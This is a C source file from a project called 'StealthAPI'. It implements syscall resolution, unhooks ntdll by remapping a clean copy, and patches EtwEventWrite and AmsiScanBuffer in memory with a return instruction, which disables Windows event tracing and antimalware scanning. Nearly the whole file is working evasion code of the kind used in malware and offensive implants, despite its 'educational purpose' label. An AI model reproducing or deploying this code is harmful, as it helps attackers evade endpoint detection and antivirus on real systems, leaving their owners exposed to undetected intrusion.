/*
 * Project: StealthAPI
 * Build for educational purpose.
 * Author: Ebere Michhael (Call Simba)
 * Telegram: @lets_sudosu
 * Make the world a better place.
 *
 * Brief: Implements syscall resolution, clean ntdll remapping/unhooking,
 *        and runtime patching of ETW and AMSI for stealthy operation.
 */

#include <windows.h>
#include "functions.h"
#include "whispers.h"
#include "ntdefs.h"
#include "win32api.h"

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);

#ifdef __cplusplus
extern "C" {
#endif

PVOID GetSyscallPtr(const char* name) {
    return (PVOID)SW3_GetSyscallAddress(SW3_HashSyscall(name));
}

void MapCleanNtdll(void) {
    MapNtdll();
}

BOOL UnhookNtdll(void) {
    LPVOID clean = MapNtdll();
    if (!clean) return FALSE;
    BOOL result = Unhook(clean);

    HMODULE hNtdll = g_Win32ApiTable.pGetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        PFN_NtUnmapViewOfSection unmap =
            (PFN_NtUnmapViewOfSection)g_Win32ApiTable.pGetProcAddress(
                hNtdll, "NtUnmapViewOfSection");
        if (unmap)
            unmap((HANDLE)-1, clean);
    }
    return result;
}

BOOL PatchETW(void) {
    HMODULE ntdll = g_Win32ApiTable.pGetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    BYTE* fn = (BYTE*)g_Win32ApiTable.pGetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) return FALSE;

    DWORD old;
    if (!g_Win32ApiTable.pVirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;
    fn[0] = 0xC3;
    g_Win32ApiTable.pVirtualProtect(fn, 1, old, &old);
    return TRUE;
}

BOOL PatchAMSI(void) {
    HMODULE amsi = g_Win32ApiTable.pLoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;

    BYTE* fn = (BYTE*)g_Win32ApiTable.pGetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) {
        g_Win32ApiTable.pFreeLibrary(amsi);
        return FALSE;
    }

    DWORD old;
    if (!g_Win32ApiTable.pVirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old)) {
        g_Win32ApiTable.pFreeLibrary(amsi);
        return FALSE;
    }
    fn[0] = 0xC3;
    g_Win32ApiTable.pVirtualProtect(fn, 1, old, &old);
    g_Win32ApiTable.pFreeLibrary(amsi);
    return TRUE;
}

#ifdef __cplusplus
}
#endif
